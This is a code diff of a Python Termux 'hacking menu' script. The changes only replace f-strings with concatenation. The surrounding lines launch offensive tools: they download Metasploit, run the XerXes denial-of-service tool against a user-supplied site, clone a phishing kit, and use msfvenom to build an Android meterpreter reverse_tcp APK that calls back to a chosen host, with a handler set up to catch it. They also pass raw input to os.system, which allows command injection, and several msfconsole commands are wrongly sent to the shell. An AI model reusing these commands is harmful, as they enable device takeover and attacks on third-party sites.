@@ -278,7 +278,7 @@ def all_termux_libs_down() :
 	os.system("git clone https://github.com/evait-security/weeman")
 	print("WEEMAN DOWNLOADED")
 	print("DOWNLOADING METASPLOIT")
-	os.system(f"wget {metasploit}")
+	os.system("wget " + metasploit)
 	print("METASPLOIT DOWNLOADED")
 	print("PLEASE WAIT...")
 	os.system("chmod +x metasploit.sh")
@@ -486,19 +486,19 @@ def startscreen_menu():
 		simple_funcs = input("hAcK --> ")
 		s_funs = simple_funcs
 		if s_funs == "1" :
-			print(f"Password with symbol --> {password}")
-			print(f"Password without symbol --> {passwordS}")
+			print("Password with symbol --> " + password)
+			print("Password without symbol --> " + passwordS)
 		elif s_funs == "2" :
 			name_fig = input("Enter name --> ")
-			os.system(f"figlet {name_fig}")
+			os.system("figlet " + name_fig)
 		elif s_funs == "3" :
 			morze_alph()
 		elif s_funs == "4" :
 			rainBow_word_ans = input("Write your word :")
-			os.system(f"toilet -f mono12 -F gay {rainBow_word_ans}")
+			os.system("toilet -f mono12 -F gay " + rainBow_word_ans)
 	elif terminal == "4" :
 		ter2 = input("Enter site's link --> ")
-		os.system(f"whois {ter2}")
+		os.system("whois " + ter2)
 	elif terminal == "1" :
 		print("Closing...")
 		os.system("clear")
@@ -512,7 +512,7 @@ def startscreen_menu():
 	elif terminal == "6" :
   	  print("Enter site's link")
   	  site_ip = input("hAcK --> ")
-  	  os.system(f"ping {site_ip}")
+  	  os.system("ping " + site_ip)
 	elif terminal == "7" :
 		os.system("clear")
 		os.system("git clone https://github.com/CyberXCodder/XerXes.git")
@@ -523,10 +523,10 @@ def startscreen_menu():
 		print("You must first agree with the rules. You are responsible for obtaining the IP address and everything else")
 		print("write site's name")
 		site_dos = input("hAcK --> ")
-		os.system(f"./xerxes {site_dos} 80")
+		os.system("./xerxes " + site_dos + " 80")
 	elif terminal == "8" :
 		os.system("clear")
-		os.system(f"wget {metasploit}")
+		os.system("wget " + metasploit)
 		os.system("chmod +x metasploit.sh")
 		os.system(pkg_install + " vim")
 		os.system("clear")
@@ -546,14 +546,14 @@ def startscreen_menu():
 		your_wifi_IP = input("hAcK --> ")
 		print("ENTER YOUR APK'S NAME")
 		your_apks_name = input("hAcK --> ")
-		os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={your_wifi_IP} lport=4444 -o /sdcard/{your_apks_name}.apk")
+		os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + your_wifi_IP + " lport=4444 -o /sdcard/" + your_apks_name + ".apk")
 		print("SECOND PART STARTING...")
 		presS = input("Press Enter")
 		os.system("cd metasploit-framework")
 		os.system("msfconsole")
 		os.system("use exploit/multi/handler")
 		os.system("set payload android/meterpreter/reverse_tcp")
-		os.system(f"set lhost {your_wifi_IP}")
+		os.system("set lhost " + your_wifi_IP)
 		os.system("set lport 4444")
 		os.system("exploit")
 	elif terminal == "11" :
@@ -660,12 +660,12 @@ in packages :
 			os.system("clear")
 			print("Type site's link or IP")
 			nmap_site_link = input("hAcK -->")
-			os.system(f"nmap {nmap_site_link}")
+			os.system("nmap " + nmap_site_link)
 		elif nmap_cevab_ans == "2" :
 			os.system("clear")
 			print("Enter site's IP")
 			nmap_site_ip = input("hAcK --> ")
-			os.system(f"nmap -sV {nmap_site_ip}")
+			os.system("nmap -sV " + nmap_site_ip)
 	elif terminal == "ID" :
 		are_logo()
 	elif terminal == "25" :
@@ -707,8 +707,8 @@ in packages :
 			print("Please wait...")
 			os.system("cd /sdcard")
 			print("Download finished after an hour")
-			print(f"Downloading {wordlistname}.txt")
-			os.system(f"wordlist -m 7 -M 15 -o /sdcard/{wordlistname}.txt 0987654321qwertyuopasdfghjklizxcvbnmQWERTYUOPASDFGHJKLIZXCVBNM ")
+			print("Downloading " + wordlistname + ".txt")
+			os.system("wordlist -m 7 -M 15 -o /sdcard/" + wordlistname + ".txt 0987654321qwertyuopasdfghjklizxcvbnmQWERTYUOPASDFGHJKLIZXCVBNM ")
 		else :
 			print("Download cancelled.")
 	elif terminal == "29" :
